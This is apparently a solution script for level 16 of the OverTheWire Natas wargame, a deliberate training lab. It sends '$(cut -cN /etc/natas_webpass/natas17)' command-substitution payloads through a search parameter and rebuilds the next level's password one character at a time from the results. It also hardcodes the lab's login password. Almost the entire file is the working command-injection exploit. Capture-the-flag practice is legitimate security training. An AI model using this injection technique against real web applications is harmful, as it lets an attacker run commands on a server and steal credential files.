import requests
import re
from typing import List

url = 'http://natas16.natas.labs.overthewire.org/'
username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

auth = (username, password)


def common_characters(lst: List[str]) -> List[str]:
    if not lst:
        # raise RuntimeError("empty list")
        return ''
    common_chars = set(lst[0].lower())

    for string in lst[1:]:
        common_chars.intersection_update(set(string.lower()))
    
    if len(common_chars) != 1:
        print("Found more or less than 1 char in common")
        return ''
    return common_chars.pop()


def run_queries(injection: str) -> None:
    res = []
    params = {'needle': injection}
    response = requests.get(url, params=params, auth=auth)
    
    if response.status_code != 200:
        print(f"status: {response.status_code}")
        raise RuntimeError("Error in query.")
    pattern = re.compile(r'<pre>(.*?)<\/pre>', re.DOTALL)
    matches = pattern.search(response.text)
    if matches:
        extracted_text = matches.group(1)
        words: list = extracted_text.split("\n")
        words = list(filter(None, words))
        return common_characters(words)
    else:
        raise RuntimeError("Match not found")

def main():
    res = ""
    for i in range(1, 35):
        ans = run_queries(f"$(cut -c{i} /etc/natas_webpass/natas17)")
        if not ans:
            print(i)
        else:
            res += ans
    print(res)

if __name__ == "__main__":
    main()
